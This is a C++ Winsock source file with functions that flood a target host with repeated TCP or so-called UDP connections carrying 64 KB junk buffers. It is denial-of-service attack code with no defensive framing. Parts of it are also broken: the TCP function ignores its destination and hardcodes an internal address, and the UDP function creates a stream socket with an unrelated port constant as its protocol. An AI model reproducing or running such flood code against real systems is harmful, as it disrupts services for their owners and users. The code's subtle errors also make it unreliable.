#pragma comment(lib, "ws2_32.lib")
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <ws2tcpip.h>
#include <random>
#include <winsock2.h>






std::string random_string(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}







bool GetSocketAddress(char* host, sockaddr_in* address)
{
	struct addrinfo* result = NULL;
	struct addrinfo* ptr = NULL;
	struct addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(host, "http", &hints, &result)) return false;

	*address = *(sockaddr_in*)(result[0].ai_addr);
	freeaddrinfo(result);
	return true;
}

void TCPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
	sockaddr_in input;
	
	input.sin_addr.s_addr = inet_addr("10.0.0.9");
	
	input.sin_port = htons(port);
	SOCKET s;

	char data[65536];
	memset(data, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		Sleep(1000 / timespersecond);
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == 0) continue;

		int cRes = connect(s, (sockaddr*)& input, sizeof(input));
		if (cRes == SOCKET_ERROR) {
			std::cout << "failed";
			closesocket(s); continue;
		}
		send(s, data, 65536, 0);
		Sleep(10);
		send(s, data, 65536, 0);

		closesocket(s);
	}
}

void UDPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) {
		std::cout << "failed";
		return;
	}
	input.sin_port = htons(port);
	SOCKET c;

	char dat[65536];
	memset(dat, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		Sleep(1000 / timespersecond);
		c = socket(AF_INET, SOCK_STREAM, IPPORT_BIFFUDP);
		if (c == 0) continue;
		int cRes = connect(c, (sockaddr*)& input, sizeof(input));
		if (cRes == SOCKET_ERROR) {
			closesocket(c); continue;
		}
		send(c, dat, 65536, 0);
		Sleep(10);
		send(c, dat, 65536, 0);

		closesocket(c);
	}
}